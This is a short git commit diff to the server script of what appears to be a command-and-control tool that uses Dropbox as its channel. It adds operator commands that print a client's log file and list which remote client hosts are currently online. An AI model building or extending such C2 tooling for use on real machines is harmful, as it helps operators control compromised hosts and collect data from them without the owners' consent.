e6371a5ac574fd424b34ba48da23843b16fc905a
NegaScout <jenik.wagner@gmail.com>
2024-01-04 18:00:24 +0100

    more local commands for server

--- src/server.py
+++ src/server.py
@@ -5,6 +5,7 @@ import ccchanel.file as ccfile
 import ccchanel.dropbox_api as cc_api
 import server.cmd as scmd
 import server.repl as srepl
+import server.util as sutil
 def check_pong(dbx, path):
     log = cclog.log_read(dbx, path)
 
@@ -15,6 +16,21 @@ def dispatch_command(dbx, path, command, *args):
 def handle_local_command(dbx, command, *args):
     if command == 'get':
         ccfile.download_file_as(dbx, args[0], f'/tmp/{args[0].replace("/", "_")}')
+    elif command == 'cat':
+        log = cclog.log_read(dbx, args[0])
+        print(f"SERVER: cating {args[0]}")
+        print(log)
+    elif command == 'online':
+        file_list = ccfile.list_files(dbx, '').keys()
+        hosts = []
+        for filename in file_list:
+            filename = f"/{filename}"
+            log = cclog.log_read(dbx, filename)
+            if log is not None and sutil.is_online(log):
+                hosts.append(filename)
+
+        print(f"SERVER: listing online clients")
+        print(hosts)
 
 if __name__ == "__main__":
     dbx = cc_api.dropbox_login()
@@ -28,3 +44,4 @@ if __name__ == "__main__":
             elif parsed_cmd.get('local', False):
                 cmd = parsed_cmd['local']
                 handle_local_command(dbx, cmd['command'], *cmd['args'])
+        time.sleep(1) # Limit 1 cmd per second, so I dont have to deal with ids xD (timestamp is also id, cuz its easy)
